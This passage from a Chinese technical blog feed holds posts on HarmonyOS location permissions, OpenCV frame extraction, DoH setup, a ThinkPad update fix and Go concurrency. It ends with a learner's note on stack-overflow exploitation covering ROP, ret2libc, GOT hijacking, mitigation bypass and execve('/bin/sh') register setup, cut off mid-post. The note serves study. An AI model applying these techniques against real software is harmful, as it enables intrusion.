class="hljs-property">locationInfo</span> = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(result);<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">blog</span>.<span class="hljs-title function_">setTitle</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">locationInfo</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>获取位置信息得不到结果</p><p>我使用的是API9FA模型，且手头现没有可供实机调试的API9设备，远程仿真设备调试多次崩溃，所以我先将此错误情况梳理如下</p><p>我们使用了如下图所示的两种方式（注释部分和未注释部分，<a href="https://gitee.com/openharmony/docs/blob/master/zh-cn/application-dev/security/accesstoken-guidelines.md#stage%E6%A8%A1%E5%9E%8B-1">参考来源</a>）均未能得到弹窗，经过实测在DevEco 3.1.0.500 Beta2版本中上述功能无法正常使用，且调试窗口在requestPermissionsFromUser()方法（经过调试运行已确认是执行到此函数时报错）执行时返回401错误</p><p><img src="https://image.0error.net/img/2023/20230614114550.png"></p><p><img src="https://image.0error.net/img/2023/2850086000399990845.20230613120016.27371993900286685318550162337585.png"></p><h2 id="解决过程"><a href="#解决过程" class="headerlink" title="解决过程"></a>解决过程</h2><p>与华为客户服务工程师沟通后，梳理上述思路进行定位处理问题有三：</p><ul><li>上述方法一中参考文档来源于openHarmonyOS，与现行HarmonyOS不属于同一部门维护，不保证可用性，例如上述方法在HarmonyOS内就无法正常使用</li><li>HarmonyOS的SDK经过多次更新迭代，目前原先旧SDK已经全部弃用（401报错原因）</li><li>上述问题仅属于接口变更问题</li></ul><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>在SDK9版本中引入了<code>geoLocationManager()</code>的<a href="https://developer.harmonyos.com/cn/docs/documentation/doc-references-V3/js-apis-geolocationmanager-0000001427745092-V3#ZH-CN_TOPIC_0000001574088789__geolocationmanagergetcurrentlocation-2">新调用方式</a>，在<code>config.json</code>文件中声明<code>ohos.permission.APPROXIMATELY_LOCATION</code>和<code>ohos.permission.LOCATION</code>权限后，使用<code>getCurrentLocation(request?: CurrentLocationRequest): Promise&lt;Location&gt;</code>方法即可弹窗并获得定位权限，下面给出我的例子，假设<code>config.json</code>中已经配置好所需权限和说明</p><p>获取权限部分</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">let</span> context = featureAbility.<span class="hljs-title function_">getContext</span>();<br><span class="hljs-keyword">let</span> <span class="hljs-attr">array</span>:<span class="hljs-title class_">Array</span>&lt;<span class="hljs-built_in">string</span>&gt; = [<span class="hljs-string">&quot;ohos.permission.APPROXIMATELY_LOCATION&quot;</span>,<span class="hljs-string">&quot;ohos.permission.LOCATION&quot;</span>];<br><span class="hljs-comment">//requestPermissionsFromUser会判断权限的授权状态来决定是否唤起弹窗</span><br>context.<span class="hljs-title function_">requestPermissionsFromUser</span>(array, <span class="hljs-number">1</span>).<span class="hljs-title function_">then</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Permission data:&quot;</span> + <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data));<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Permission data permissions:&quot;</span> + <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data.<span class="hljs-property">permissions</span>));<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Permission data result:&quot;</span> + <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data.<span class="hljs-property">authResults</span>));<br>&#125;, <span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Failed to start ability&#x27;</span>, err.<span class="hljs-property">code</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>获取定位部分</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">try</span>&#123;<br>geoLocationManager.<span class="hljs-title function_">getCurrentLocation</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">result</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;current location: &#x27;</span> + <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(result));<br>&#125;).<span class="hljs-title function_">catch</span>(<span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&quot;locationerror=&quot;</span> + <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(error));<br>    &#125;);<br>&#125;<span class="hljs-keyword">catch</span> (err)&#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&quot;locationerrorCode:&quot;</span> + err.<span class="hljs-property">code</span> + <span class="hljs-string">&quot;,errMessage:&quot;</span> + err.<span class="hljs-property">message</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://image.0error.net/img/2023/image-20230614113515417.png"></p><p>变更为上述函数与接口后顺利弹窗并获取到位置信息</p><p><img src="https://image.0error.net/img/2023/image-20230614113636687.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>HarmonyOS接口变更还较为频繁，文档内部将各个SDK版本接口均罗列了出来，还需进一步完善分类</li><li>ArkTS异步执行，获取权限时需要处理好权限授权以及获取定位的先后同步顺序关系</li><li>通过侧载JS的方式也可以利用第三方API获取大致的经纬度信息，留给各位自行探究</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> bugs </tag>
            
            <tag> HarmonyOS </tag>
            
            <tag> ArkTS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用opencv库使用Python将视频逐帧转为图片</title>
      <link href="/2023/05/60427.html"/>
      <url>/2023/05/60427.html</url>
      
        <content type="html"><![CDATA[<p>做成型的语义分割软件需要，写了一个</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">video2pic</span>(<span class="hljs-params">videoFile, outputFile</span>):<br>    vc = cv2.VideoCapture(videoFile)<br>    c = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> vc.isOpened():<br>        rval, frame = vc.read()<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;error open video!&#x27;</span>)<br>        rval = <span class="hljs-literal">False</span><br><br>    timeF = <span class="hljs-number">100</span>  <span class="hljs-comment"># 帧率间隔</span><br>    <span class="hljs-keyword">while</span> rval:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-number">1</span>)<br>        rval, frame = vc.read()<br>        <span class="hljs-keyword">if</span> c % timeF == <span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-number">2</span>)<br>            cv2.imwrite(outputFile + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(c / timeF)) + <span class="hljs-string">&#x27;.jpg&#x27;</span>, frame)<br>        c += <span class="hljs-number">1</span><br>        cv2.waitKey(<span class="hljs-number">1</span>)<br>    vc.release()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    videoFile = <span class="hljs-string">&#x27;./test.mp4&#x27;</span>  <span class="hljs-comment"># 输入路径</span><br>    outputFile = <span class="hljs-string">&#x27;./video2pic_res/frame&#x27;</span>  <span class="hljs-comment"># 输出路径</span><br>    video2pic(videoFile, outputFile)<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows系统下DoH配置小记</title>
      <link href="/2023/04/4873.html"/>
      <url>/2023/04/4873.html</url>
      
        <content type="html"><![CDATA[<h1 id="Windows系统下DoH配置小记"><a href="#Windows系统下DoH配置小记" class="headerlink" title="Windows系统下DoH配置小记"></a>Windows系统下DoH配置小记</h1><h2 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a>浏览器</h2><h3 id="Edge"><a href="#Edge" class="headerlink" title="Edge"></a>Edge</h3><ul><li>打开<code>edge://settings/privacy</code></li><li>使用安全的 DNS 指定如何查找网站的网络地址</li><li>设置自定义服务商为<code>https://doh.opendns.com/dns-query&#123;?dns&#125;</code></li></ul><h3 id="Firefox"><a href="#Firefox" class="headerlink" title="Firefox"></a>Firefox</h3><ul><li>打开设置-网络设置</li><li>启用基于HTTPS的DNS</li><li>选择自定义提供商为<code>https://doh.opendns.com/dns-query</code></li></ul><h3 id="Chrome"><a href="#Chrome" class="headerlink" title="Chrome"></a>Chrome</h3><ul><li>打开<code>chrome://settings/security?search=https</code></li><li>找到<code>使用安全DNS</code></li><li>自定义为<code>https://doh.opendns.com/dns-query</code></li></ul><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h3 id="使用Arashi-DNS"><a href="#使用Arashi-DNS" class="headerlink" title="使用Arashi.DNS"></a>使用<a href="https://github.com/mili-tan/ArashiDNS.Dekunua">Arashi.DNS</a></h3><ul><li>下载release版本后打开，在我的电脑里面cloudflare已经由Microsoft内置，我只需要添加opendns即可，如果没有cloudflare但是想使用的话，还需要自行添加</li><li>点击添加</li><li>URL为<code>208.67.222.222</code>，查询模板为<code>https://doh.opendns.com/dns-query</code></li><li>点击确定</li><li><strong>重启Windows</strong>，这里是系统级别的改动，必须重启Windows后才能生效</li></ul><h3 id="配置系统设置"><a href="#配置系统设置" class="headerlink" title="配置系统设置"></a>配置系统设置</h3><p>进入设置-网络设置内，修改DNS配置，将IPv4的DNS配置改为手动，分别填入<code>208.67.222.222</code>以及<code>1.0.0.1</code>，选择模板为<code>自动生成</code>，此时应该可以看到下方模板内已自动填入相关内容，如果没有填入，则说明前面配置有误，需要再次检查</p><h2 id="验证使用情况"><a href="#验证使用情况" class="headerlink" title="验证使用情况"></a>验证使用情况</h2><ul><li><a href="https://welcome.umbrella.com/">https://welcome.umbrella.com</a></li><li><a href="https://welcome.opendns.com/">https://welcome.opendns.com</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Thinkpad T14升级Windows11ver22h2失败问题解决小记</title>
      <link href="/2023/04/56463.html"/>
      <url>/2023/04/56463.html</url>
      
        <content type="html"><![CDATA[<h1 id="Thinkpad-T14升级Windows11ver22h2失败问题解决"><a href="#Thinkpad-T14升级Windows11ver22h2失败问题解决" class="headerlink" title="Thinkpad T14升级Windows11ver22h2失败问题解决"></a>Thinkpad T14升级Windows11ver22h2失败问题解决</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>手头的ThinkPad在近一年的时间里每次升级Windows 11的22h2版本每次都会报错，具体有以下几种情况：</p><ol><li>更新过程中无问题，重启后黑屏更新过程中会卡在26%左右，然后蓝屏报<code>KENERAL_CHECK_FAIL</code>，接着便自动重启进入修复程序</li><li>在Windows Update更新中报错<code>0xC1900101</code></li><li>在上述错误出现后，再次更新会出现<code>0x80248007</code>及<code>0x80248014</code>等报错拒绝更新，此类错误代码有很多，刷新一次有一个问题，但是无法更新就是了</li></ol><p>上述问题已经以下方法，均无果：</p><ul><li>运行Windows疑难问题解答修复Windows Update</li><li>删除Windows更新缓存重新加载</li><li>使用官方提供的Windows 11 22h2镜像装载并进行完整更新</li></ul><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>后来我在经过如下一整套操作后，此问题得以解决：</p><ul><li>关闭BitLocker加密功能并解除系统盘已有的加密（此步骤一定要先执行，否则后面对BIOS进行操作后检测到安全程序变更会要求BitLocker密钥认证，如果忘记了会很麻烦）</li><li>进入BIOS，找到<code>Inter virtualization</code>和<code>virtual dma kernel</code>选项将其置为<code>disable</code>状态（也有人说只关闭dma即可，但是对我没有作用）</li></ul><p><img src="https://image.0error.net/img/20235d27a12386106ed1f80be8daeb966f4e.jpeg" alt="Security-Virtualization"></p><ul><li>接着再到Boot选项内，<strong>暂时</strong>关闭Security boot</li></ul><p>接着保存并重启，以上问题即可解决。</p><p>根据Reddit论坛Lenovo用户反馈，Lenovo品牌系列电脑均可用此方式尝试解决，work for many lenovo devices.</p><h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><p>虚拟化功能关闭后，更新虽然成功但是WSL等虚拟化服务功能会全部无法使用，如果有开机自动运行的服务可能会有问题，所以在更新结束后建议及时将上述关闭功能重新<code>enable</code>，经实测不影响22h2系统正常使用以及后续的patch。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>建议Lenovo能够真正找点工程师解决一下这类问题，别的品牌电脑都没有类似问题，但是找Lenovo中国工程师总是车轱辘话来回说，后来直接让我重置系统安装…那成百上千的环境您能给我重新配吗- -</p><p>好在最终找到了解决方案，谨以此分享给所有更新失败的Lenovo用户。</p>]]></content>
      
      
      
        <tags>
            
            <tag> bugs </tag>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>golang并发编程示例小记</title>
      <link href="/2022/10/37974.html"/>
      <url>/2022/10/37974.html</url>
      
        <content type="html"><![CDATA[<h1 id="golang并发编程示例小记"><a href="#golang并发编程示例小记" class="headerlink" title="golang并发编程示例小记"></a>golang并发编程示例小记</h1><p>Go提供了sync和channel两种方式来支持协程的并发</p><h2 id="0x00-sync"><a href="#0x00-sync" class="headerlink" title="0x00 sync"></a>0x00 sync</h2><p>如果我们希望并发下载N个资源，多个并发协程之间不需要通信，那么就可以使用sync.WaitGroup，等待所有并发协程执行结束</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;sync&quot;</span><br><span class="hljs-string">&quot;time&quot;</span><br>)<br><br><span class="hljs-keyword">var</span> wg sync.WaitGroup<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">download</span><span class="hljs-params">(url <span class="hljs-type">string</span>)</span></span>&#123;<br>fmt.Println(<span class="hljs-string">&quot;start downloading:&quot;</span>, url)<br>time.Sleep(time.Second)<span class="hljs-comment">//模拟耗时</span><br>fmt.Println(url + <span class="hljs-string">&quot;OK!&quot;</span>)<br>wg.Done()<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>;i&lt;<span class="hljs-number">10</span>;i++&#123;<br>wg.Add(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">go</span> download(<span class="hljs-string">&quot;a.com/&quot;</span> + <span class="hljs-type">string</span>(i+<span class="hljs-string">&#x27;0&#x27;</span>))<br>&#125;<br>fmt.Println(<span class="hljs-string">&quot;waiting...&quot;</span>)<br>wg.Wait()<br>fmt.Println(<span class="hljs-string">&quot;Done!&quot;</span>)<br>&#125;<br><br><span class="hljs-comment">//waiting...</span><br><span class="hljs-comment">//start downloading: a.com/7</span><br><span class="hljs-comment">//start downloading: a.com/2</span><br><span class="hljs-comment">//start downloading: a.com/1</span><br><span class="hljs-comment">//start downloading: a.com/5</span><br><span class="hljs-comment">//start downloading: a.com/3</span><br><span class="hljs-comment">//start downloading: a.com/0</span><br><span class="hljs-comment">//start downloading: a.com/4</span><br><span class="hljs-comment">//start downloading: a.com/8</span><br><span class="hljs-comment">//start downloading: a.com/6</span><br><span class="hljs-comment">//start downloading: a.com/9</span><br><span class="hljs-comment">//a.com/1OK!</span><br><span class="hljs-comment">//a.com/0OK!</span><br><span class="hljs-comment">//a.com/5OK!</span><br><span class="hljs-comment">//a.com/3OK!</span><br><span class="hljs-comment">//a.com/7OK!</span><br><span class="hljs-comment">//a.com/2OK!</span><br><span class="hljs-comment">//a.com/8OK!</span><br><span class="hljs-comment">//a.com/6OK!</span><br><span class="hljs-comment">//a.com/9OK!</span><br><span class="hljs-comment">//a.com/4OK!</span><br><span class="hljs-comment">//Done!</span><br></code></pre></td></tr></table></figure><ul><li>wg.Add(1)表示为wg添加一个计数，wg.Done()减去一个计数</li><li>go download()表示启动新的协程并发执行download函数</li><li>wg.Wait()等待所有协程执行结束</li></ul><p>可以看到原来需要10s的并发操作，并发后约1-2s即可执行完毕</p><h2 id="0x01-channel"><a href="#0x01-channel" class="headerlink" title="0x01 channel"></a>0x01 channel</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;sync&quot;</span><br><span class="hljs-string">&quot;time&quot;</span><br>)<br><br><span class="hljs-keyword">var</span> wg sync.WaitGroup<br><br><span class="hljs-keyword">var</span> ch = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">string</span>, <span class="hljs-number">10</span>)<span class="hljs-comment">//创建大小为10的缓冲信道</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">download</span><span class="hljs-params">(url <span class="hljs-type">string</span>)</span></span>&#123;<br>fmt.Println(<span class="hljs-string">&quot;start downloading:&quot;</span>, url)<br>time.Sleep(time.Second)<span class="hljs-comment">//模拟耗时</span><br>fmt.Println(url + <span class="hljs-string">&quot; OK!&quot;</span>)<br>ch &lt;- url<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>;i&lt;<span class="hljs-number">10</span>;i++&#123;<br><span class="hljs-keyword">go</span> download(<span class="hljs-string">&quot;a.com/&quot;</span> + <span class="hljs-type">string</span>(i+<span class="hljs-string">&#x27;0&#x27;</span>))<br>&#125;<br><span class="hljs-keyword">for</span> i:=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">10</span>;i++&#123;<br>msg:=&lt;-ch<span class="hljs-comment">//等待信道返回消息</span><br>fmt.Println(<span class="hljs-string">&quot;finish: &quot;</span>, msg)<br>&#125;<br><span class="hljs-comment">//fmt.Println(&quot;waiting...&quot;)</span><br><span class="hljs-comment">//wg.Wait()</span><br>fmt.Println(<span class="hljs-string">&quot;Done!&quot;</span>)<br>&#125;<br><br><span class="hljs-comment">//start downloading: a.com/9</span><br><span class="hljs-comment">//start downloading: a.com/2</span><br><span class="hljs-comment">//start downloading: a.com/5</span><br><span class="hljs-comment">//start downloading: a.com/7</span><br><span class="hljs-comment">//start downloading: a.com/0</span><br><span class="hljs-comment">//start downloading: a.com/8</span><br><span class="hljs-comment">//start downloading: a.com/6</span><br><span class="hljs-comment">//start downloading: a.com/1</span><br><span class="hljs-comment">//start downloading: a.com/3</span><br><span class="hljs-comment">//start downloading: a.com/4</span><br><span class="hljs-comment">//a.com/4 OK!</span><br><span class="hljs-comment">//a.com/5 OK!</span><br><span class="hljs-comment">//a.com/9 OK!</span><br><span class="hljs-comment">//a.com/1 OK!</span><br><span class="hljs-comment">//a.com/7 OK!</span><br><span class="hljs-comment">//a.com/0 OK!</span><br><span class="hljs-comment">//a.com/3 OK!</span><br><span class="hljs-comment">//a.com/6 OK!</span><br><span class="hljs-comment">//a.com/8 OK!</span><br><span class="hljs-comment">//finish:  a.com/4</span><br><span class="hljs-comment">//finish:  a.com/5</span><br><span class="hljs-comment">//finish:  a.com/9</span><br><span class="hljs-comment">//finish:  a.com/1</span><br><span class="hljs-comment">//finish:  a.com/7</span><br><span class="hljs-comment">//finish:  a.com/0</span><br><span class="hljs-comment">//finish:  a.com/3</span><br><span class="hljs-comment">//finish:  a.com/6</span><br><span class="hljs-comment">//finish:  a.com/8</span><br><span class="hljs-comment">//a.com/2 OK!</span><br><span class="hljs-comment">//finish:  a.com/2</span><br><span class="hljs-comment">//Done!</span><br></code></pre></td></tr></table></figure><p>使用channel信道，可以在协程之间传递消息，阻塞等待并发协程返回消息</p>]]></content>
      
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于栈溢出的研究</title>
      <link href="/2022/09/30289.html"/>
      <url>/2022/09/30289.html</url>
      
        <content type="html"><![CDATA[<h1 id="关于栈溢出的研究"><a href="#关于栈溢出的研究" class="headerlink" title="关于栈溢出的研究"></a>关于栈溢出的研究</h1><p>最近入坑pwn，学习了很多偏底层的知识点，在这里试着总结<del>（CV）</del>一下。</p><h2 id="0x00-关于栈溢出"><a href="#0x00-关于栈溢出" class="headerlink" title="0x00 关于栈溢出"></a>0x00 关于栈溢出</h2><h3 id="1-call-amp-ret"><a href="#1-call-amp-ret" class="headerlink" title="1. call&amp;ret"></a>1. call&amp;ret</h3><p>说到栈就不得不提到程序调用，说到程序调用就不得不提到call和ret，call指令的操作是调用一个进程，指示处理器从新的内存地址开始执行而最终又通过ret来使处理服务回到调用方的进程上。</p><p>这个过程从底层角度来说，就是call的时候将返回地址压入堆栈，然后再把被调用的指令地址放入EIP（指令寄存器），当被调用部分完成并return时，就会从堆栈区把返回地址弹回到指令指针寄存器。</p><p>函数调用栈在内存中从高地址向低地址生长，所以栈顶指针ESP在压栈时需要–，退栈时++</p><p><img src="https://image.0error.net/img/2022910385_V4RUG9N5G9WW6DR.png"></p><h3 id="2-关于函数调用"><a href="#2-关于函数调用" class="headerlink" title="2. 关于函数调用"></a>2. 关于函数调用</h3><p>函数状态主要会涉及到三个寄存器（ESP, EBP, EIP）</p><ul><li>ESP 存储函数调用栈的栈顶地址，在压栈退栈时发生变化</li><li>EBP 存储当前函数状态的基地址，在函数运行时不变，用来索引确定函数参数或局部变量的位置</li><li>EIP 存储即将执行的指令的地址</li></ul><h3 id="3-函数调用过程细节"><a href="#3-函数调用过程细节" class="headerlink" title="3. 函数调用过程细节"></a>3. 函数调用过程细节</h3><ol><li>将被调用函数参数压栈</li></ol><p><img src="https://image.0error.net/img/2022910385_N8KNZ97XXQEAAKA.png"></p><ol start="2"><li>将被调用函数的返回地址压栈</li></ol><p><img src="https://image.0error.net/img/2022910385_7B56VD8MKXM6GCZ.png"></p><ol start="3"><li>ESP压栈，并将当前栈顶地址传到EBP</li></ol><p><img src="https://image.0error.net/img/2022910385_VEVR92K43Q2YVYX.png"></p><ol start="4"><li>将被调用函数的局部变量压栈</li></ol><p><img src="https://image.0error.net/img/2022910385_NJTHKUDCZ2RACAJ.png"></p><ol start="5"><li>将被调用函数的局部变量弹出</li></ol><p><img src="https://image.0error.net/img/2022910385_P55KJUC2UA9ZJ77.png"></p><ol start="6"><li>将调用方的EBP弹出，并存入EBP</li></ol><p><img src="https://image.0error.net/img/2022910385_PKA6J3FTQZ7QGQA.png"></p><ol start="7"><li>将被调用函数的返回地址弹出，并存入EIP</li></ol><p><img src="https://image.0error.net/img/2022910385_8C3RT7J2QFHSAFD.png"></p><p>而根据栈溢出不同的修改覆盖方式，又存在以下方法</p><ul><li>shellcode 修改返回地址指向溢出数据的一段指令</li><li>ret2libc 修改返回地址指向内存中已有的函数</li><li>ROP 修改返回地址指向内存中已有的一段指令</li><li>hijack GOT 修改被调用函数的地址，指向另一个函数</li></ul><h2 id="0x01-栈溢出的防御手段"><a href="#0x01-栈溢出的防御手段" class="headerlink" title="0x01 栈溢出的防御手段"></a>0x01 栈溢出的防御手段</h2><p>根据checksec的保护机制检查总结如下：</p><ul><li>RELRO  有Partial RELRO和FULL RELRO,如果开启FULL RELRO，意味着我们无法修改got表，设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，以此来减少对GOT表的攻击</li><li>Stack  如果栈中开启了Canary found，那么久不能直接用溢出的方法覆盖栈中的返回地址，而且要通过改写指针与局部变量、leak canary、overwrite canary的方法绕过</li><li>NX  开启后栈中的数据没有执行权限，所以覆盖的call esp,jmp esp,亦或是直接shellcode的方法都不能使用</li></ul><h2 id="0x02-ROP的研究"><a href="#0x02-ROP的研究" class="headerlink" title="0x02 ROP的研究"></a>0x02 ROP的研究</h2><h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><p>通过执行gadgets改变寄存器的值然后控制程序执行系统调用，系统调用的方法就是shellcode，而改变寄存器值的方法如下</p><ul><li><p>32位程序</p><ol><li>将EAX寄存器的值设置为0xbEAX&#x3D;0xb</li><li>将EBX寄存器的值设置为”&#x2F;bin&#x2F;sh”字符串的地址:EBX&#x3D;&amp;(“&#x2F;bin&#x2F;sh”)</li><li>将ECX和EDX寄存器的值设置为0: ECX&#x3D;EDX&#x3D;0</li></ol></li><li><p>64位程序</p><ol><li>将RAX寄存器的值设为0x3b  RAX&#x3D;0x3b</li><li>将RDI寄存器的值设置为”bin&#x2F;sh”字符串地址  RDI&#x3D;&amp;(“&#x2F;bin&#x2F;sh”)</li><li>将RSI和RDC寄存器的值都设为0  RSI&#x3D;RDX&#x3D;0</li></ol></li></ul><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p>控制函数执行libc中的函数，通常是返回到某个函数的plt处或者函数的实际地址，如果这样做我们就需要知道system函数的地址，且需要找到”&#x2F;bin&#x2F;sh”字符串的地址，而system函数的执行结构如下图所示，所以在得到两个地址后中间参数任意填充即可</p><p><img src="https://image.0error.net/img/2022/20220923195340.png" 